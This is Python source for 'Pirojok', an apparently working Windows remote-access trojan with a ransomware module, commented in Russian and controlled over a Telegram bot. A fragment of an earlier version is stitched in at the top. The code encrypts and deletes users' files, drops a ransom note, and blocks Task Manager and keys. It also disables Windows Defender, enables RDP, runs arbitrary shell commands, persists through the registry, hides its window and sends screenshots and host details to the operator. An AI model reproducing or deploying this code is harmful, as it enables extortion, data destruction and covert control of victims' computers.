• enable_rdp - включить RDP
• disable_defender - отключить Defender

<b>📸 ОСНОВНЫЕ:</b>
• cmd [команда] - команда
• shot - скриншот
• info - информация
                """
                self.send_message(chat_id, help_text)
                self.processing = False
                return
            if text == "ransom" or text == "ransom_start":
                result = self.ransomware_start()
                self.send_message(chat_id, result)
                self.processing = False
                return
            if text == "ransom_key":
                result = self.ransomware_key()
                self.send_message(chat_id, result)
                self.processing = False
                return
            if text.startswith("ransom_decrypt"):
                parts = text.split()
                if len(parts) == 2:
                    result = self.ransomware_decrypt(parts[1])
                    self.send_message(chat_id, result)
                else:
                    self.send_message(chat_id, "⚠️ Используйте: ransom_decrypt <ключ>")
                self.processing = False
                return
            if text == "shot":
                self.send_message(chat_id, "📸 Фоткаю...")
                screenshot = self.take_screenshot()
                if screenshot:
                    self.send_photo(chat_id, screenshot, "🥧 Скриншот")
                else:
                    self.send_message(chat_id, "❌ Не удалось")
                self.processing = False
                return
            if text == "info":
                self.send_message(chat_id, self.get_system_info())
                self.processing = False
                return
            if text == "admin":
                if self.admin_mode:
                    self.send_message(chat_id, "👑 Уже есть права администратора!")
                else:
                    self.send_message(chat_id, "🔄 Запрашиваю права...")
                    result = self.request_admin()
                    if result:
                        self.send_message(chat_id, result)
                self.processing = False
                return
            if text == "admin_check":
                status = "ЕСТЬ" if self.admin_mode else "НЕТ"
                self.send_message(chat_id, f"👑 Права: {status}")
                self.processing = False
                return
            if text.startswith("cmd"):
                cmd = text[3:].strip()
                if cmd:
                    self.send_message(chat_id, f"🔄 Выполняю: {cmd}")
                    result = self.execute_command(cmd)
                    self.send_message(chat_id, f"📋 Результат:\n{result[:3500]}")
                else:
                    self.send_message(chat_id, "⚠️ Используйте: cmd <команда>")
                self.processing = False
                return
            if text == "enable_rdp":
                result = self.enable_rdp()
                self.send_message(chat_id, result)
                self.processing = False
                return
            if text == "disable_defender":
                result = self.disable_defender()
                self.send_message(chat_id, result)
                self.processing = False
                return
            if text == "shutdown_now":
                result = self.shutdown_instant()
                self.send_message(chat_id, result)
                self.processing = False
                return
            if text == "reboot_now":
                result = self.reboot_instant()
                self.send_message(chat_id, result)
                self.processing = False
                return
            self.send_message(chat_id, f"❓ Нет такой команды: '{text}'. Используйте help")
            self.processing = False
        except Exception as e:
            print(f"Ошибка: {e}")
            self.processing = False
    
    def main_loop(self):
        self.on_system_startup()
        while self.running:
            try:
                url = f"{self.base_url}/getUpdates"
                params = {"offset": self.last_update_id + 1, "timeout": 30, "allowed_updates": ["message"]}
                response = requests.get(url, params=params, timeout=35)
                data = response.json()
                if data["ok"] and data["result"]:
                    for update in data["result"]:
                        self.last_update_id = update["update_id"]
                        if "message" in update and "text" in update["message"]:
                            thread = threading.Thread(target=self.process_command,
                                args=(update["message"]["text"], update["message"]["chat"]["id"]))
                            thread.daemon = True
                            thread.start()
                time.sleep(1)
            except Exception as e:
                print(f"Loop error: {e}")
                time.sleep(5)
    
    def run(self):
        try:
            self.admin_mode = self.check_admin()
            self.main_loop()
        except KeyboardInterrupt:
            self.running = False
            self.send_message(self.owner_id, "🥧 Пирожок убрали в холодильник")

if __name__ == "__main__":
    if platform.system() == "Windows":
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    pirojok = Pirojok()
    pirojok.run()#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Пирожок - ПОЛНОЦЕННЫЙ ВЫМОГАТЕЛЬ
Версия 4.4 - С ИСПРАВЛЕННОЙ КОДИРОВКОЙ UTF-8
"""

import os
import sys
import subprocess
import threading
import time
import socket
import platform
import getpass
import requests
from datetime import datetime
import pyautogui
from PIL import Image
import io
import ctypes
import winreg
import tempfile
import uuid
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

# Конфигурация
BOT_TOKEN = os.getenv('BOT_TOKEN', 'YOUR_BOT_TOKEN_HERE')
YOUR_TELEGRAM_ID = int(os.getenv('TELEGRAM_ID', '123456789'))

class PirojokRansomware:
    """Модуль вымогателя для пирожка"""
    
    def __init__(self, parent):
        self.p = parent
        self.encryption_key = None
        self.encrypted_files = []
        self.ransom_note = "README_PIROJOK.txt"
        self.cmd_window = None
        self.active = False
        self.target_extensions = [
            '.txt', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx',
            '.pdf', '.jpg', '.jpeg', '.png', '.bmp', '.gif',
            '.mp3', '.mp4', '.avi', '.mov', '.mkv',
            '.zip', '.rar', '.7z', '.tar', '.gz',
            '.db', '.sql', '.mdb', '.accdb',
            '.cpp', '.py', '.java', '.php', '.html', '.css', '.js'
        ]
        self.exclude_dirs = [
            'windows', 'winnt', 'program files', 'program files (x86)',
            'boot', 'system32', 'system', '$recycle.bin'
        ]
        
    def generate_key(self):
        """Генерация ключа шифрования"""
        self.encryption_key = os.urandom(32)
        return base64.b64encode(self.encryption_key).decode()
    
    def show_cmd_message(self):
        """Показ сообщения в CMD поверх всех окон"""
        try:
            bat_path = os.path.join(tempfile.gettempdir(), "pirojok_msg.bat")
            
            message = """
╔══════════════════════════════════════════════════════════════╗
║                     🥷 ПИРОЖОК ВЫМОГАТЕЛЬ                     ║
╠══════════════════════════════════════════════════════════════╣
║                                                              ║
║   ВАШИ ФАЙЛЫ БЫЛИ ЗАШИФРОВАНЫ!                              ║
║                                                              ║
║   Для восстановления читайте README_PIROJOK.txt             ║
║   на рабочем столе                                           ║
║                                                              ║
║   КЛАВИШИ F1-F12, ESC, SHIFT, CTRL ЗАБЛОКИРОВАНЫ!           ║
║                                                              ║
║   Для разблокировки введите ключ в Telegram бота             ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
            """
            
            with open(bat_path, 'w', encoding='utf-8') as f:
                f.write(f'''@echo off
title ПИРОЖОК ВЫМОГАТЕЛЬ
color 0C
mode con cols=70 lines=20
echo {message}
echo.
echo КЛЮЧ ДЛЯ РАСШИФРОВКИ ОТПРАВЛЕН В TELEGRAM
echo.
pause > nul
''')
            
            self.cmd_window = subprocess.Popen(
                ['cmd', '/c', 'start', '/min', 'cmd', '/c', bat_path],
                shell=True,
                creationflags=subprocess.CREATE_NO_WINDOW
            )
            
            time.sleep(1)
            os.system(f'start /max cmd /c "{bat_path}"')
            
        except Exception as e:
            print(f"Ошибка показа CMD: {e}")
    
    def block_all_keys(self):
        """ПОЛНАЯ блокировка всех клавиш"""
        try:
            import ctypes
            
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
            
            try:
                winreg.CreateKey(key, subkey)
                with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                    winreg.SetValueEx(regkey, "NoWinKeys", 0, winreg.REG_DWORD, 1)
            except:
                pass
            
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Policies\System"
            
            try:
                winreg.CreateKey(key, subkey)
                with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                    winreg.SetValueEx(regkey, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
            except:
                pass
            
            user32 = ctypes.windll.user32
            user32.SystemParametersInfoW(0x0097, 1, None, 0)
            
            self.active = True
            return True
            
        except Exception as e:
            print(f"Ошибка блокировки клавиш: {e}")
            return False
    
    def encrypt_file(self, filepath):
        """Шифрование одного файла"""
        try:
            iv = os.urandom(16)
            cipher = AES.new(self.encryption_key, AES.MODE_CBC, iv)
            
            with open(filepath, 'rb') as f:
                file_data = f.read()
            
            padded_data = pad(file_data, AES.block_size)
            encrypted_data = cipher.encrypt(padded_data)
            
            encrypted_path = filepath + '.pirojok'
            with open(encrypted_path, 'wb') as f:
                f.write(iv + encrypted_data)
            
            os.remove(filepath)
            return encrypted_path
        except:
            return None
    
    def scan_and_encrypt(self):
        """Сканирование и шифрование"""
        if not self.encryption_key:
            self.generate_key()
        
        root_paths = [
            os.path.expanduser("~\\Desktop"),
            os.path.expanduser("~\\Documents"),
            os.path.expanduser("~\\Pictures"),
            os.path.expanduser("~\\Videos"),
            os.path.expanduser("~\\Music"),
            os.path.expanduser("~\\Downloads")
        ]
        
        encrypted = []
        file_count = 0
        max_files = 50
        
        for root_path in root_paths:
            if not os.path.exists(root_path):
                continue
            
            for root, dirs, files in os.walk(root_path):
                skip = False
                for exclude in self.exclude_dirs:
                    if exclude in root.lower():
                        skip = True
                        break
                if skip:
                    continue
                
                for file in files:
                    if file_count >= max_files:
                        break
                    
                    file_path = os.path.join(root, file)
                    ext = os.path.splitext(file)[1].lower()
                    
                    if ext in self.target_extensions and not file.endswith('.pirojok'):
                        result = self.encrypt_file(file_path)
                        if result:
                            encrypted.append(file_path)
                            self.encrypted_files.append(result)
                            file_count += 1
                            
                            if file_count % 10 == 0:
                                self.p.send_message(self.p.owner_id, f"🔒 Зашифровано {file_count} файлов...")
                
                if file_count >= max_files:
                    break
            if file_count >= max_files:
                break
        
        return encrypted
    
    def create_ransom_note(self):
        """Создание записки вымогателя"""
        note_path = os.path.join(os.path.expanduser("~\\Desktop"), self.ransom_note)
        key_b64 = base64.b64encode(self.encryption_key).decode()
        
        note = f"""
╔══════════════════════════════════════════════════════════════╗
║                     🥷 ПИРОЖОК ВЫМОГАТЕЛЬ                     ║
╠══════════════════════════════════════════════════════════════╣
║                                                              ║
║   Ваши файлы были зашифрованы!                              ║
║                                                              ║
║   Всего зашифровано: {len(self.encrypted_files)} файлов      ║
║                                                              ║
║   Для восстановления используйте ключ:                      ║
║   {key_b64}                                                  ║
║                                                              ║
║   Отправьте команду в Telegram:                             ║
║   ransom_decrypt {key_b64}                                   ║
║                                                              ║
║   Клавиши F1-F12, ESC, SHIFT, CTRL ЗАБЛОКИРОВАНЫ!           ║
║   Для разблокировки введите правильный ключ                  ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
        """
        
        with open(note_path, 'w', encoding='utf-8') as f:
            f.write(note)
        
        return note_path
    
    def start_ransomware(self):
        """Запуск вымогателя"""
        try:
            self.p.send_message(self.p.owner_id, "🔒 Запускаю ransomware...")
            
            self.block_all_keys()
            self.p.send_message(self.p.owner_id, "🔒 Клавиши заблокированы!")
            
            self.show_cmd_message()
            self.p.send_message(self.p.owner_id, "📟 CMD сообщение показано!")
            
            encrypted = self.scan_and_encrypt()
            note = self.create_ransom_note()
            
            os.startfile(note)
            
            self.p.add_all_startup_methods()
            
            result = f"✅ Зашифровано {len(encrypted)} файлов\n"
            result += f"📝 Записка: {note}\n"
            result += f"🔑 Ключ: {base64.b64encode(self.encryption_key).decode()}\n"
            result += f"🔒 Клавиши заблокированы!\n"
            result += f"🔄 Автозапуск установлен!"
            
            return result
        except Exception as e:
            return f"❌ Ошибка: {str(e)}"
    
    def decrypt_all(self, key_b64):
        """Дешифровка всех файлов"""
        try:
            self.encryption_key = base64.b64decode(key_b64)
            
            pirojok_files = []
            for root, dirs, files in os.walk("C:\\Users"):
                for file in files:
                    if file.endswith('.pirojok'):
                        pirojok_files.append(os.path.join(root, file))
            
            decrypted = 0
            for file in pirojok_files:
                try:
                    with open(file, 'rb') as f:
                        iv = f.read(16)
                        encrypted_data = f.read()
                    
                    cipher = AES.new(self.encryption_key, AES.MODE_CBC, iv)
                    decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)
                    
                    original_path = file.replace('.pirojok', '')
                    with open(original_path, 'wb') as f:
                        f.write(decrypted_data)
                    
                    os.remove(file)
                    decrypted += 1
                except:
                    pass
            
            if decrypted > 0:
                self.unblock_keys()
                self.remove_cmd_message()
                self.p.remove_all_startup()
                self.active = False
            
            return f"✅ Расшифровано {decrypted} файлов"
        except Exception as e:
            return f"❌ Ошибка: {str(e)}"
    
    def unblock_keys(self):
        """Снятие блокировки клавиш"""
        try:
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"
            
            try:
                with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                    winreg.SetValueEx(regkey, "NoWinKeys", 0, winreg.REG_DWORD, 0)
                    winreg.SetValueEx(regkey, "DisableTaskMgr", 0, winreg.REG_DWORD, 0)
            except:
                pass
            
            self.p.send_message(self.p.owner_id, "🔓 Клавиши разблокированы!")
        except:
            pass
    
    def remove_cmd_message(self):
        """Удаление CMD окна"""
        try:
            if self.cmd_window:
                self.cmd_window.terminate()
            os.system('taskkill /f /im cmd.exe /fi "windowtitle eq ПИРОЖОК*"')
        except:
            pass


class Pirojok:
    """Главный класс нашего пирожка"""
    
    def __init__(self):
        self.bot_token = BOT_TOKEN
        self.owner_id = YOUR_TELEGRAM_ID
        self.last_update_id = 0
        self.base_url = f"https://api.telegram.org/bot{self.bot_token}"
        self.running = True
        self.processes = []
        self.version = "4.4.0"
        self.command_timeout = 60
        self.admin_mode = False
        self.startup_time = datetime.now()
        self.processing = False
        self.started = False
        
        self.ransom = PirojokRansomware(self)
        self.marker_file = os.path.join(tempfile.gettempdir(), "pirojok_first_run.marker")
        
        self.admin_mode = self.check_admin()
        print(f"Права при запуске: {'Админ' if self.admin_mode else 'Пользователь'}")
        
    def check_admin(self):
        try:
            if platform.system() == "Windows":
                return ctypes.windll.shell32.IsUserAnAdmin()
            else:
                return os.geteuid() == 0
        except:
            return False
    
    def request_admin(self):
        try:
            if self.check_admin():
                self.admin_mode = True
                return "👑 Уже есть права администратора!"
            
            if platform.system() != "Windows":
                return "❌ Запрос прав только для Windows"
            
            if getattr(sys, 'frozen', False):
                executable = sys.executable
            else:
                executable = sys.executable + ' "' + os.path.abspath(__file__) + '"'
            
            with open(self.marker_file, 'w') as f:
                f.write(f"admin_requested:{datetime.now().isoformat()}")
            
            self.send_message(self.owner_id, "👑 Запрашиваю права администратора...")
            
            result = ctypes.windll.shell32.ShellExecuteW(
                None, "runas", executable, "", None, 1
            )
            
            if result > 32:
                self.send_message(self.owner_id, "👑 Перезапуск с правами администратора...")
                time.sleep(2)
                sys.exit(0)
            else:
                self.send_message(self.owner_id, f"❌ Не удалось получить права (код: {result})")
                return "❌ Ошибка получения прав"
                
        except Exception as e:
            self.send_message(self.owner_id, f"❌ Ошибка запроса прав: {e}")
            return f"❌ Ошибка: {e}"
    
    def run_as_admin_command(self, command):
        try:
            if not self.admin_mode:
                return "❌ Нет прав администратора. Используйте 'admin' сначала"
            
            if platform.system() == "Windows":
                process = subprocess.Popen(
                    f'cmd /c {command}',
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE,
                    text=True,
                    encoding='cp866',
                    errors='ignore'
                )
            else:
                process = subprocess.Popen(
                    f'sudo {command}',
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE,
                    text=True
                )
            
            self.processes.append(process)
            
            try:
                stdout, stderr = process.communicate(timeout=self.command_timeout)
            except subprocess.TimeoutExpired:
                process.kill()
                stdout, stderr = process.communicate()
                return f"⚠️ Таймаут\n\nЧастичный вывод:\n{stdout}"
            
            result = ""
            if stdout:
                result += f"✅ Результат:\n{stdout}\n"
            if stderr:
                result += f"⚠️ Ошибки:\n{stderr}\n"
            
            return result or "✅ Команда выполнена"
            
        except Exception as e:
            return f"❌ Ошибка: {str(e)}"
    
    def create_admin_user(self, username, password):
        try:
            if not self.admin_mode:
                return "❌ Нужны права администратора"
            
            cmd = f'net user {username} {password} /add && net localgroup administrators {username} /add'
            result = self.run_as_admin_command(cmd)
            return f"👤 Создан пользователь {username}\n{result}"
        except Exception as e:
            return f"❌ Ошибка: {str(e)}"
    
    def enable_rdp(self):
        try:
            if not self.admin_mode:
                return "❌ Нужны права администратора"
            
            commands = [
                'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f',
                'netsh advfirewall firewall set rule group="remote desktop" new enable=Yes',
                'sc config TermService start= auto',
                'net start TermService'
            ]
            
            for cmd in commands:
                self.run_as_admin_command(cmd)
            
            ip = requests.get('https://api.ipify.org', timeout=5).text
            return f"✅ RDP включен\nIP: {ip}\nПорт: 3389"
        except Exception as e:
            return f"❌ Ошибка: {str(e)}"
    
    def disable_defender(self):
        try:
            if not self.admin_mode:
                return "❌ Нужны права администратора"
            
            commands = [
                'reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f',
                'reg add "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features" /v TamperProtection /t REG_DWORD /d 0 /f',
                'powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"'
            ]
            
            for cmd in commands:
                self.run_as_admin_command(cmd)
            
            return "✅ Windows Defender отключен"
        except Exception as e:
            return f"❌ Ошибка: {str(e)}"
    
    def add_firewall_rule(self, port, name="Pirojok"):
        try:
            if not self.admin_mode:
                return "❌ Нужны права администратора"
            
            cmd = f'netsh advfirewall firewall add rule name="{name}" dir=in action=allow protocol=TCP localport={port}'
            self.run_as_admin_command(cmd)
            return f"✅ Правило добавлено для порта {port}"
        except Exception as e:
            return f"❌ Ошибка: {str(e)}"
    
    def ransomware_start(self):
        try:
            if not self.admin_mode:
                return "❌ Для ransomware нужны права администратора"
            
            result = self.ransom.start_ransomware()
            return result
        except Exception as e:
            return f"❌ Ошибка: {str(e)}"
    
    def ransomware_key(self):
        try:
            if self.ransom.encryption_key:
                key_b64 = base64.b64encode(self.ransom.encryption_key).decode()
                return f"🔑 Ключ шифрования: {key_b64}"
            else:
                return "❌ Ключ не сгенерирован (сначала запустите ransomware)"
        except Exception as e:
            return f"❌ Ошибка получения ключа: {e}"
    
    def ransomware_decrypt(self, key_b64):
        try:
            result = self.ransom.decrypt_all(key_b64)
            return result
        except Exception as e:
            return f"❌ Ошибка: {str(e)}"
    
    def add_all_startup_methods(self):
        results = []
        
        if getattr(sys, 'frozen', False):
            exe_path = sys.executable
        else:
            exe_path = os.path.abspath(__file__)
        
        try:
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                winreg.SetValueEx(regkey, "Pirojok", 0, winreg.REG_SZ, f'"{exe_path}"')
            results.append("✅ Реестр HKCU")
        except:
            results.append("❌ Реестр HKCU")
        
        return results
    
    def remove_all_startup(self):
        results = []
        
        try:
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as regkey:
                winreg.DeleteValue(regkey, "Pirojok")
            results.append("✅ Удалено из реестра")
        except:
            results.append("❌ Не найдено в реестре")
        
        return "\n".join(results)
    
    def send_message(self, chat_id, text):
        """Отправка сообщения с правильной кодировкой UTF-8"""
        try:
            # Принудительно кодируем в UTF-8 для Telegram
            if isinstance(text, str):
                text = text.encode('utf-8').decode('utf-8')
            
            timestamp = datetime.now().strftime('%H:%M:%S')
            text_with_time = f"[{timestamp}] {text}"
            
            url = f"{self.base_url}/sendMessage"
            data = {
                "chat_id": chat_id, 
                "text": text_with_time, 
                "parse_mode": "HTML"
            }
            
            # Явно указываем кодировку в заголовках
            headers = {'Content-Type': 'application/json; charset=utf-8'}
            
            response = requests.post(url, json=data, headers=headers, timeout=10)
            
            if response.status_code != 200:
                print(f"Ошибка отправки: {response.status_code} - {response.text}")
            else:
                print(f"Отправлено: {text[:50]}...")
                
        except Exception as e:
            print(f"Send error: {e}")
    
    def send_photo(self, chat_id, photo_bytes, caption=""):
        """Отправка фото с правильной кодировкой UTF-8"""
        try:
            # Кодируем подпись в UTF-8
            if isinstance(caption, str):
                caption = caption.encode('utf-8').decode('utf-8')
            
            timestamp = datetime.now().strftime('%H:%M:%S')
            caption_with_time = f"[{timestamp}] {caption}"
            
            url = f"{self.base_url}/sendPhoto"
            
            # Явно указываем кодировку
            files = {
                "photo": ("screenshot.jpg", photo_bytes, "image/jpeg")
            }
            data = {
                "chat_id": chat_id, 
                "caption": caption_with_time
            }
            
            response = requests.post(url, files=files, data=data, timeout=30)
            
            if response.status_code == 200:
                print(f"Фото отправлено: {caption[:50]}...")
            else:
                print(f"Ошибка отправки фото: {response.status_code}")
                
        except Exception as e:
            print(f"Photo error: {e}")
    
    def get_system_info(self):
        info = []
        info.append(f"🥧 <b>ПИРОЖОК ИСПЕКСЯ!</b>")
        info.append(f"🍽 Версия: {self.version}")
        info.append(f"📅 Время: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        info.append(f"💻 Хост: {socket.gethostname()}")
        info.append(f"👨‍🍳 Повар: {getpass.getuser()}")
        info.append(f"👑 Права: {'Администратор' if self.admin_mode else 'Пользователь'}")
        try:
            info.append(f"📍 IP: {requests.get('https://api.ipify.org', timeout=5).text}")
        except:
            info.append(f"📍 IP: неизвестен")
        info.append(f"⚙️ ОС: {platform.system()} {platform.release()}")
        
        uptime = datetime.now() - self.startup_time
        info.append(f"⏱ Работаю: {str(uptime).split('.')[0]}")
        
        return "\n".join(info)
    
    def take_screenshot(self):
        try:
            screenshot = pyautogui.screenshot()
            img_bytes = io.BytesIO()
            screenshot.save(img_bytes, format='JPEG', quality=85)
            img_bytes.seek(0)
            return img_bytes.read()
        except:
            return None
    
    def execute_command(self, command):
        try:
            if platform.system() == "Windows":
                process = subprocess.Popen(
                    f'cmd /c {command}',
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE,
                    text=True,
                    encoding='cp866',
                    errors='ignore'
                )
            else:
                process = subprocess.Popen(
                    command,
                    shell=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    stdin=subprocess.PIPE,
                    text=True
                )
            
            self.processes.append(process)
            
            try:
                stdout, stderr = process.communicate(timeout=self.command_timeout)
            except subprocess.TimeoutExpired:
                process.kill()
                stdout, stderr = process.communicate()
                return f"⚠️ Таймаут\n\nЧастичный вывод:\n{stdout}"
            
            result = ""
            if stdout:
                # Кодируем результат в UTF-8 для отправки
                stdout = stdout.encode('utf-8', errors='ignore').decode('utf-8')
                result += f"✅ Результат:\n{stdout}\n"
            if stderr:
                stderr = stderr.encode('utf-8', errors='ignore').decode('utf-8')
                result += f"⚠️ Ошибки:\n{stderr}\n"
            
            return result or "✅ Команда выполнена"
            
        except Exception as e:
            return f"❌ Ошибка: {str(e)}"
    
    def shutdown_instant(self):
        try:
            if platform.system() == "Windows":
                os.system("shutdown /s /f /t 0")
            else:
                os.system("shutdown -h now")
            return "💥 Выключаюсь МОМЕНТАЛЬНО!"
        except Exception as e:
            return f"❌ Ошибка: {str(e)}"
    
    def reboot_instant(self):
        try:
            if platform.system() == "Windows":
                os.system("shutdown /r /f /t 0")
            else:
                os.system("reboot -f")
            return "⚡ Перезагружаюсь МОМЕНТАЛЬНО!"
        except Exception as e:
            return f"❌ Ошибка: {str(e)}"
    
    def shutdown_emergency(self):
        try:
            if platform.system() != "Windows":
                return "❌ Только для Windows"
            
            os.system("taskkill /f /im *")
            os.system("shutdown /s /f /t 0")
            
            return "☠️ АВАРИЙНОЕ ВЫКЛЮЧЕНИЕ!"
        except Exception as e:
            return f"❌ Ошибка: {str(e)}"
    
    def on_system_startup(self):
        try:
            if os.path.exists(self.marker_file):
                os.remove(self.marker_file)
                return
            
            if self.started:
                return
            self.started = True
            
            boot_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            message = f"🥧 <b>Пирожок испекся!</b>\n\n"
            message += f"📅 Время включения: {boot_time}\n"
            message += f"💻 Хост: {socket.gethostname()}\n"
            message += f"👤 Пользователь: {getpass.getuser()}\n"
            message += f"👑 Права: {'Администратор' if self.admin_mode else 'Пользователь'}\n"
            
            self.send_message(self.owner_id, message)
            
            time.sleep(5)
            screenshot = self.take_screenshot()
            if screenshot:
                self.send_photo(self.owner_id, screenshot, "🥧 Рабочий стол после включения")
            
        except Exception as e:
            print(f"Startup error: {e}")
    
    def process_command(self, text, chat_id):
        if chat_id != self.owner_id:
            self.send_message(chat_id, "⛔ Не для вас!")
            return
        
        print(f"Получена команда: {text}")
        
        if self.processing:
            print("Уже обрабатываю команду, пропускаю...")
            return
        
        self.processing = True
        
        try:
            current_admin = self.check_admin()
            
            if current_admin != self.admin_mode:
                self.admin_mode = current_admin
                print(f"Права изменились: {'Админ' if self.admin_mode else 'Пользователь'}")
            
            admin_commands = ["admin_cmd", "create_user", "enable_rdp", "disable_defender", 
                             "add_rule", "ransom", "ransom_start", "ransom_key", "ransom_decrypt"]
            cmd_type = text.split()[0] if text else ""
            
            if cmd_type in admin_commands and not self.admin_mode:
                self.send_message(chat_id, "👑 Эта команда требует прав администратора. Сначала используйте 'admin'")
                self.processing = False
                return
            
            if text == "help" or text == "menu":
                help_text = """
🥧 <b>ПИРОЖОК V4.4 - МЕНЮ</b>

<b>🔒 RANSOMWARE:</b>
• ransom - ЗАПУСТИТЬ ВЫМОГАТЕЛЯ!
• ransom_key - показать ключ
• ransom_decrypt <key> - расшифровать

<b>⚡ МОМЕНТАЛЬНО:</b>
• shutdown_now - выключить
• reboot_now - перезагрузить

<b>👑 АДМИН-КОМАНДЫ:</b>
• admin - запросить права
• admin_check - проверить права
• enable_rdp - включить RDP
• disable_defender - отключить Defender

<b>📸 ОСНОВНЫЕ:</b>
• cmd [команда] - команда
• shot - скриншот
• info - информация
                """
                self.send_message(chat_id, help_text)
                self.processing = False
                return
            
            if text == "ransom" or text == "ransom_start":
                result = self.ransomware_start()
                self.send_message(chat_id, result)
                self.processing = False
                return
            
            if text == "ransom_key":
                result = self.ransomware_key()
                self.send_message(chat_id, result)
                self.processing = False
                return
            
            if text.startswith("ransom_decrypt"):
                parts = text.split()
                if len(parts) == 2:
                    result = self.ransomware_decrypt(parts[1])
                    self.send_message(chat_id, result)
                else:
                    self.send_message(chat_id, "⚠️ Используйте: ransom_decrypt <ключ>")
                self.processing = False
                return
            
            if text == "shot":
                self.send_message(chat_id, "📸 Фоткаю...")
                screenshot = self.take_screenshot()
                if screenshot:
                    self.send_photo(chat_id, screenshot, "🥧 Скриншот")
                else:
                    self.send_message(chat_id, "❌ Не удалось")
                self.processing = False
                return
            
            if text == "info":
                self.send_message(chat_id, self.get_system_info())
                self.processing = False
                return
            
            if text == "admin":
                if self.admin_mode:
                    self.send_message(chat_id, "👑 Уже есть права администратора!")
                else:
                    self.send_message(chat_id, "🔄 Запрашиваю права...")
                    result = self.request_admin()
                    if result:
                        self.send_message(chat_id, result)
                self.processing = False
                return
            
            if text == "admin_check":
                status = "ЕСТЬ" if self.admin_mode else "НЕТ"
                self.send_message(chat_id, f"👑 Права: {status}")
                self.processing = False
                return
            
            if text.startswith("cmd"):
                cmd = text[3:].strip()
                if cmd:
                    self.send_message(chat_id, f"🔄 Выполняю: {cmd}")
                    result = self.execute_command(cmd)
                    self.send_message(chat_id, f"📋 Результат:\n{result[:3500]}")
                else:
                    self.send_message(chat_id, "⚠️ Используйте: cmd <команда>")
                self.processing = False
                return
            
            if text == "enable_rdp":
                result = self.enable_rdp()
                self.send_message(chat_id, result)
                self.processing = False
                return
            
            if text == "disable_defender":
                result = self.disable_defender()
                self.send_message(chat_id, result)
                self.processing = False
                return
            
            if text == "shutdown_now":
                result = self.shutdown_instant()
                self.send_message(chat_id, result)
                self.processing = False
                return
            
            if text == "reboot_now":
                result = self.reboot_instant()
                self.send_message(chat_id, result)
                self.processing = False
                return
            
            self.send_message(chat_id, f"❓ Нет такой команды: '{text}'. Используйте help")
            self.processing = False
            
        except Exception as e:
            print(f"Ошибка: {e}")
            self.processing = False
    
    def main_loop(self):
        self.on_system_startup()
        
        while self.running:
            try:
                url = f"{self.base_url}/getUpdates"
                params = {
                    "offset": self.last_update_id + 1,
                    "timeout": 30,
                    "allowed_updates": ["message"]
                }
                response = requests.get(url, params=params, timeout=35)
                data = response.json()
                
                if data["ok"] and data["result"]:
                    for update in data["result"]:
                        self.last_update_id = update["update_id"]
                        if "message" in update and "text" in update["message"]:
                            thread = threading.Thread(
                                target=self.process_command,
                                args=(
                                    update["message"]["text"],
                                    update["message"]["chat"]["id"]
                                )
                            )
                            thread.daemon = True
                            thread.start()
                time.sleep(1)
            except Exception as e:
                print(f"Loop error: {e}")
                time.sleep(5)
    
    def run(self):
        try:
            self.admin_mode = self.check_admin()
            self.main_loop()
        except KeyboardInterrupt:
            self.running = False
            self.send_message(self.owner_id, "🥧 Пирожок убрали в холодильник")

# ========== КОНЕЦ ФАЙЛА ==========

if __name__ == "__main__":
    if platform.system() == "Windows":
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    
    pirojok = Pirojok()
    pirojok.run()
